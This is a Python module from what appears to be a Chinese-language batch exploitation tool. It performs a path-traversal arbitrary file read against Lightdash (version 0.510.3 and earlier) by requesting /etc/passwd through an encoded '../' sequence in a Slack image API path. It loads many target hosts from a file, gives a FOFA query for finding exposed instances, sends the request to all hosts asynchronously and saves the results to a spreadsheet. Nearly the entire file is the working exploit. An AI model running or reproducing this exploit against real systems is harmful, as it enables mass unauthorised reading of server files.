

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork


def help():
    print('''
    fofa: "Lightdash"
        1. Lightdash 任意文件读取, 批量测试, version <= 0.510.3
    x. 退出
    ''')

def vul_Routers(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Accept': '*/*',
        'Connection': 'Keep-Alive'
    }
    body = ''
    method = "GET"
    path = "/api/v1/slack/image/slack-image%2F..%2F..%2F..%2Fetc%2Fpasswd"
    notes = ""
    return (url, method, headers, body, path, notes)


def run():
    OUTDIR = "result/Lightdash"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    # 获取资产目标
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    num = int(input("执行的指令: "))

    if num == 1:
        data = []
        for url in li:
            item = vul_Routers(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}-Lightdash 任意文件读取.xlsx")

    else:
        print('bye..')
